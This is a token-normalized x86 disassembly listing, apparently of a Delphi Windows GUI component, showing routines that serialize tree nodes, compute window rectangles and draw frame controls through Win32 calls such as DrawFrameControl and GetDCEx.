mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456fbe
mov eax [ ebp - 0x8 ]
call sub_4564ac
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455c80
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_456d94
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403370
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_455fa0
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_456d94
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_44d554
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_44e334
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403174
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_456fe4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_416c50
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424a70
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45703c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423f30
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_4246d4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_424674
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_424674
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423f30
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_424674
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_424674
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4570c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_456fe4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_45703c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_45703c
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_456fe4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_45703c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_45703c
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4571a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4572f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c210
mov eax [ ebp - 0x4 ]
call sub_4246ac
xor eax eax
push ebp
push sub_4572d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424af0
xor eax eax
push ebp
push sub_4572bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_450b4c
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572c3
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424af0
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_450b10
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44cfd4
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_457304
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_45294c
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_44d07c
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_44d038
mov ecx eax
xor edx edx
xor eax eax
call sub_416c50
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_453e1c
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416c78
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_457478
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_457478
pop ecx
mov eax ebx
call sub_403174
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_457478
pop ecx
sub_4574ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_457478
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403174
xor eax eax
mov [ esi + 0x64 ] eax
sub_457508
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_456518
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_457544
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_457544
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4577b1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c1c
mov edx [ ebp - 0x8 ]
pop eax
call sub_4041b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax [ ebx + 0x14 ]
call sub_455ca4
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c1c
mov edx [ ebp - 0x10 ]
pop eax
call sub_4041b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4577b8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f10
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_456054
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_4561cc
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_456208
mov eax [ ebx + 0x18 ]
call sub_456054
mov [ edx + 0x18 ] eax
push esi
push sub_457d54
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_456580
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_456208
mov eax [ esi + 0x64 ]
call sub_4561cc
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403174
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_457d2c
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403174
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_455d50
mov edx eax
mov eax edi
call sub_4561f4
mov eax edi
call sub_456054
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_457d54
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_456580
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_457d54
mov edx [ eax + 0x14 ]
mov eax esi
call sub_456580
mov eax [ ebx + 0x14 ]
call sub_403174
mov eax edi
call sub_403174
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_4577c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_45294c
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407d40
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_4561f4
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_4528b8
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_4561f4
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_457bdc
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_457d54
xor edx edx
mov eax edi
call sub_456580
sub_45789c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4561cc
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402978
mov edx eax
mov eax ebx
call sub_4561f4
sub_4578d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40439c
xor eax eax
push ebp
push sub_457943
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4041ac
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45794a
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_457950
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4579ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_455f5c
mov eax [ ebp - 0x8 ]
call sub_4578d8
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_457950
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a06
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_457950
pop ecx
sub_457a0c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457b45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457af4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4528b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457afb
mov eax [ ebp - 0x10 ]
call sub_403174
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4578d8
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4528cc
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_457afb
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_457950
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b4c
lea eax [ ebp - 0x14 ]
call sub_403eec
retn
sub_457b54
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4562a4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4562cc
call sub_457b54
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4562a4
call sub_457b54
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_455cd4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_4561cc
mov edx eax
mov eax ebx
call sub_4561f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4561f4
jmp r-xdata
sub_457bdc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_457b54
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_457c20
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4561cc
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_4561f4
sub_457c50
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_453e1c
mov edx eax
mov eax [ rw-data ]
call sub_4587b0
mov eax [ ebx + 0x14 ]
call sub_453e1c
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_457d64
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_457cb0
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_4587b0
mov eax ebx
call sub_457d64
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_4561f4
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_4561f4
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_457bdc
push ebx
push sub_457d54
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_456580
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_457d2c
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4528b8
test eax eax
jle r-xdata
push ebx
push sub_457d54
xor edx edx
mov eax ebx
call sub_456580
sub_457d64
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_455d98
mov [ esp ] eax
